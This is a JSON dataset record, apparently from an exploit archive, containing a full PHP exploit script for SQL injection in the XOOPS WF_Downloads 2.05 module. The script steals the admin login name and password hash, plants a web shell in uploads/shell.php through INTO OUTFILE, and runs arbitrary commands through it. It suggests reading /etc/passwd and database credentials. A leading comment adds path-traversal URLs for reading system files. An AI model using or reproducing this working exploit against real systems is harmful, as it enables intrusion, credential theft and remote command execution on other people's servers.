{
  "id": "1315",
  "title": "XOOPS (wfdownloads) 2.05 Module - Multiple Vulnerabilities",
  "cve": "CVE-2005-3681",
  "vuln_type": "sqli",
  "code": "<?php\r\n\r\n/*\r\nrgod:\r\nhttp://[target]/[path_to_xoops]/class/xoopseditor/textarea/editor_registry.php?xoopsConfig[language]=../../../../../../../../../../script\r\nhttp://[target]/[path_to_xoops]/class/xoopseditor/textarea/editor_registry.php?xoopsConfig[language]=../../../../../../../../../../boot.ini%00\r\nhttp://[target]/[path_to_xoops]/class/xoopseditor/koivi/editor_registry.php?xoopsConfig[language]=../../../../../../../../../../script\r\nhttp://[target]/[path_to_xoops]/class/xoopseditor/koivi/editor_registry.php?xoopsConfig[language]=../../../../../../../../../../boot.ini%00\r\nhttp://[target]/[path_to_xoops]/class/xoopseditor/dhtmltextarea/editor_registry.php?xoopsConfig[language]=../../../../../../../../../../script\r\nhttp://[target]/[path_to_xoops]/class/xoopseditor/dhtmltextarea/editor_registry.php?xoopsConfig[language]=../../../../../../../../../../boot.ini%00\r\nadded for future reference /str0ke\r\n*/\r\n\r\n#   ---XOOPS_WFd205_xpl.php                             11.35 12/11/2005       #\r\n#                                                                              #\r\n#          XOOPS WF_Downloads Module v 2.05 SQL injection /                    #\r\n#      Admin credentials disclosure & remote commands execution all-in-one     #\r\n#                              by rgod                                         #\r\n#                  site: http://rgod.altervista.org                            #\r\n#                                                                              #\r\n#  usage: launch from Apache, fill in requested fields, then go!               #\r\n#                                                                              #\r\n#  make these changes in php.ini if you have troubles                          #\r\n#  with this script:                                                           #\r\n#  allow_call_time_pass_reference = on                                         #\r\n#  register_globals = on                                                       #\r\n#                                                                              #\r\n#  Sun-Tzu: \"Indirect tactics, efficiently applied, are inexhausible as Heaven #\r\n#  and Earth, unending as the flow of rivers and streams; like the sun and     #\r\n#  moon, they end but to begin anew; like the four seasons, they pass away to  #\r\n#  return once more.                                                           #\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\", 2);\r\nob_implicit_flush (1);\r\n\r\necho'<html><head><title>XOOPS WF_Downloads module 2.05 SQL Injection    </title>\r\n<meta http-equiv=\"Content-Type\"  content=\"text/html; charset=iso-8859-1\"> <style\r\ntype=\"text/css\"> body {\tbackground-color:#111111; SCROLLBAR-ARROW-COLOR:#ffffff;\r\nSCROLLBAR-BASE-COLOR: black;    CURSOR: crosshair;    color:   #1CB081; }    img\r\n{background-color:   #FFFFFF   !important}  input  {background-color:    #303030\r\n!important} option {  background-color:   #303030   !important}         textarea\r\n{background-color: #303030 !important} input {color: #1CB081 !important}  option\r\n{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox\r\n{background-color: #303030 !important} select {font-weight: normal;       color:\r\n#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;\r\nbackground-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:\r\n0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em\r\n!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em\r\n!important} \th2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em\r\n!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:\r\nnormal !important} *{text-decoration: none !important} a:link,a:active,a:visited\r\n{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline;\r\ncolor : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;\r\nfont-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;\r\nfont-weight:bold; font-style: italic;}--></style></head><body><p class=\"Stile6\">\r\nXOOPS WF_Downloads module 2.05 SQL Injection                      </p><p class=\"\r\nStile6\">a script by rgod at <a href=\"http://rgod.altervista.org\"target=\"_blank\">\r\nhttp://rgod.altervista.org</a></p><table width=\"84%\"><tr><td width=\"43%\">  <form\r\nname=\"form1\"      method=\"post\"   action=\"'.$SERVER[PHP_SELF].'?path=value&host=\r\nvalue&port=value&command=value&proxy=value&action=value\"><p><input   type=\"text\"\r\nname=\"host\"> <span class=\"Stile5\"> * hostname (ex: www.sitename.com) </span></p>\r\n<p><input type=\"text\" name=\"path\"><span class=\"Stile5\"> * path ( ex: /xoops/  or\r\njust / )</span></p><p><input type=\"text\" name=\"username\"><span class=\"Stile5\"> *\r\nusername</span></p><p><input type=\"text\" name=\"password\"><span class=\"Stile5\"> *\r\n...and password, to retrieve a session cookie</span> </p> <p><input  type=\"text\"\r\nname=\"action\"><span class=\"Stile5\"> * action: \"HASH\" to disclose admin loginname\r\n& MD5 password hash, \"CMD\" to launch commands </span> </p><p> <input type=\"text\"\r\nname=\"pathtoWWW\"><span class=\"Stile5\">path to WWW ftom Mysql directory,need this\r\nfor \"...INTO OUTFILE ...\" statement (default: ../../www) </span></p><p>   <input\r\ntype=\"text\" name=\"table_prefix\"> <span class=\"Stile5\"> specify a table  prefix\r\nother than the default (fXZtr_)</span></p><p><input type=\"text\" name=\"port\">\r\n<span class=\"Stile5\">specify a port other than 80 (default value)</span> </p><p>\r\n<input type=\"text\" name=\"command\"> <span class=\"Stile5\">a Unix command, example:\r\nls -la  to list directories, cat /etc/passwd to show passwd file, cat ./../mainf\r\nile.php to see database username and password</span></p><p><input type=\"text\"\r\nname=\"proxy\"> <span class=\"Stile5\"> send exploit through an HTTP proxy (ip:port)\r\n</span></p><p><input type=\"submit\"name=\"Submit\" value=\"go!\"> </p> </form>  </td>\r\n</tr></table></body></html>';\r\n\r\n\r\nfunction show($headeri)\r\n{\r\n$ii=0;\r\n$ji=0;\r\n$ki=0;\r\n$ci=0;\r\necho '<table border=\"0\"><tr>';\r\nwhile ($ii <= strlen($headeri)-1)\r\n{\r\n$datai=dechex(ord($headeri[$ii]));\r\nif ($ji==16) {\r\n             $ji=0;\r\n             $ci++;\r\n             echo \"<td>&nbsp;&nbsp;</td>\";\r\n             for ($li=0; $li<=15; $li++)\r\n                      { echo \"<td>\".$headeri[$li+$ki].\"</td>\";\r\n\t\t\t    }\r\n            $ki=$ki+16;\r\n            echo \"</tr><tr>\";\r\n            }\r\nif (strlen($datai)==1) {echo \"<td>0\".$datai.\"</td>\";} else\r\n{echo \"<td>\".$datai.\"</td> \";}\r\n$ii++;\r\n$ji++;\r\n}\r\nfor ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)\r\n                      { echo \"<td>&nbsp&nbsp</td>\";\r\n                       }\r\n\r\nfor ($li=$ci*16; $li<=strlen($headeri); $li++)\r\n                      { echo \"<td>\".$headeri[$li].\"</td>\";\r\n\t\t\t    }\r\necho \"</tr></table>\";\r\n}\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\n\r\nfunction sendpacket() //if you have sockets module loaded, 2x speed! if not,load\r\n\t\t              //next function to send packets\r\n{\r\n  global $proxy, $host, $port, $packet, $html, $proxy_regex;\r\n  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\r\n  if ($socket < 0) {\r\n                   echo \"socket_create() failed: reason: \" . socket_strerror($socket) . \"<br>\";\r\n                   }\r\n\t      else\r\n \t\t  {   $c = preg_match($proxy_regex,$proxy);\r\n              if (!$c) {echo 'Not a valid prozy...';\r\n                        die;\r\n                       }\r\n                    echo \"OK.<br>\";\r\n                    echo \"Attempting to connect to \".$host.\" on port \".$port.\"...<br>\";\r\n                    if ($proxy=='')\r\n\t\t   {\r\n\t\t     $result = socket_connect($socket, $host, $port);\r\n\t\t   }\r\n\t\t   else\r\n\t\t   {\r\n\r\n\t\t   $parts =explode(':',$proxy);\r\n                   echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n\t\t   $result = socket_connect($socket, $parts[0],$parts[1]);\r\n\t\t   }\r\n\t\t   if ($result < 0) {\r\n                                     echo \"socket_connect() failed.\\r\\nReason: (\".$result.\") \" . socket_strerror($result) . \"<br><br>\";\r\n                                    }\r\n\t                       else\r\n\t\t                    {\r\n                                     echo \"OK.<br><br>\";\r\n                                     $html= '';\r\n                                     socket_write($socket, $packet, strlen($packet));\r\n                                     echo \"Reading response:<br>\";\r\n                                     while ($out= socket_read($socket, 2048)) {$html.=$out;}\r\n                                     echo nl2br(htmlentities($html));\r\n                                     echo \"Closing socket...\";\r\n                                     socket_close($socket);\r\n\r\n\t\t\t\t    }\r\n                  }\r\n}\r\nfunction sendpacketii($packet)\r\n{\r\nglobal $proxy, $host, $port, $html, $proxy_regex;\r\nif ($proxy=='')\r\n           {$ock=fsockopen(gethostbyname($host),$port);}\r\n             else\r\n           {\r\n\t   $c = preg_match($proxy_regex,$proxy);\r\n              if (!$c) {echo 'Not a valid prozy...';\r\n                        die;\r\n                       }\r\n\t   $parts=explode(':',$proxy);\r\n\t    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n\t    $ock=fsockopen($parts[0],$parts[1]);\r\n\t    if (!$ock) { echo 'No response from proxy...';\r\n\t\t\tdie;\r\n\t\t       }\r\n\t   }\r\nfputs($ock,$packet);\r\nif ($proxy=='')\r\n  {\r\n\r\n    $html='';\r\n    while (!feof($ock))\r\n      {\r\n        $html.=fgets($ock);\r\n      }\r\n  }\r\nelse\r\n  {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))\r\n    {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\nfclose($ock);\r\necho nl2br(htmlentities($html));\r\n}\r\n\r\nif (($host<>\"\") and ($path<>\"\") and ($username<>\"\") and ($password<>\"\"))\r\n{\r\n\r\n$port=intval(trim($port));\r\nif ($port=='') {$port=80;}\r\nif (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\nif ($pathtoWWW=='') {$pathtoWWW=\"../../www\";}\r\n#default, path for \"INTO OUTFILE <[path][file]>, two dirs up from mysql data directory, change it for\r\n#different installations\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\nif ($table_prefix=='') {$table_prefix=\"fXZtr_\";}\r\n$action=strtoupper($action);\r\nif (($action<>'HASH') and ($action<>'CMD')) {echo \"Specify an action...\"; die;}\r\nif ($action==\"CMD\"){if ($command==\"\"){echo \"specify a command...\"; die;}}\r\n\r\n# STEP 1 -> Login to retrieve a session cookie, bypass referrer check...\r\n$data=\"uname=\".urlencode($username).\"&pass=\".urlencode($password).\"&op=login\";\r\n$packet=\"POST \".$p.\"user.php HTTP/1.1\\r\\n\";\r\n$packet.=\"Host: \".$host.\":\".$port.\"\\r\\n\";\r\n$packet.=\"Accept-Encoding: text/plain\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.\":\".$port.$path.\"/user.php?xoops_redirect=%2Fmodules%2Fprofile%2Factivate.php%3Fop%3Dactv%26id%3D15%26actkey%3D&PHPSESSID=7ed3f806816476461a96e18c28044414\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nshow($packet);\r\nsendpacketii($packet);\r\n$temp=explode(\"Set-Cookie: \",$html);\r\n$temp2=explode(' ',$temp[1]);\r\n$cookie=$temp2[0];\r\necho '<br>Your cookie: '.htmlentities($cookie);\r\n\r\nif ($action=='HASH'){\r\n# STEP 2a -> Disclose Admin MD5 password hash\r\n$SQL=\"-' UNION SELECT 0,0,loginname,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,pass,0,0 FROM \";\r\n$SQL.=$table_prefix.\"users WHERE level=5/*\";\r\n$SQL=urlencode($SQL);\r\n$packet=\"GET \".$p.\"/modules/wfdownloads/viewcat.php?list=\".$SQL.\" HTTP/1.1\\r\\n\";\r\n$packet.=\"Host: \".$host.\":\".$port.\"\\r\\n\";\r\n$packet.=\"Cookie: \".$cookie.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nshow($packet);\r\nsendpacketii($packet);\r\n\r\n$temp=explode('<span class=\"itemTitle\">',$html);\r\n$temp2=explode('</span>',$temp[1]);\r\necho \"LOGINNAME: \".$loginname=$temp2[0].'<BR>';\r\n$temp=explode('<div style=\"margin-left: 6px;\" align=\"justify\">',$html);\r\n$temp2=explode('</div>',$temp[2]);\r\necho \"MD5 HASH: \".$hash=$temp2[0].'<BR>';\r\n}\r\n\r\nelse\r\nif ($action=='CMD'){\r\n# STEP 3a -> Inject a shell through a query...\r\n$SHELL=\"<?php error_reporting(0);ini_set(\\\"max_execution_time\\\",0);echo \\\"Hi Master \\\";system(\\$_GET[cmd]);?>\";\r\n$SQL=\"-1'or'a'='a' UNION SELECT 0,0,0,'\".$SHELL.\"',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 INTO\";\r\n$SQL.=\"OUTFILE '\".$pathtoWWW.$path.\"uploads/shell.php' FROM \".$table_prefix.\"wfdownloads_downloads/*\";\r\n$SQL=urlencode($SQL);\r\n$packet=\"GET \".$p.\"/modules/wfdownloads/viewcat.php?list=\".$SQL.\" HTTP/1.1\\r\\n\";\r\n$packet.=\"Host: \".$host.\":\".$port.\"\\r\\n\";\r\n$packet.=\"Cookie: \".$cookie.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nshow($packet);\r\nsendpacketii($packet);\r\n\r\n# STEP 3b -> Launch commands...\r\n$packet=\"GET \".$p.\"/uploads/shell.php?cmd=\".urlencode($command).\" HTTP/1.1\\r\\n\";\r\n$packet.=\"Host: \".$host.\":\".$port.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nshow($packet);\r\nsendpacketii($packet);\r\nif (eregi(\"Hi Master\",$html)) {echo \"<br>Exploit Succeded...\";}\r\n                         else {echo \"<br>Exploit Failed...\";}\r\n}\r\n}\r\nelse\r\n{echo \"Fill * requested fields, optionally specify a proxy...\";}\r\n?>\r\n\r\n# milw0rm.com [2005-11-12]",
  "url": "https://www.exploit-db.com/exploits/1315"
}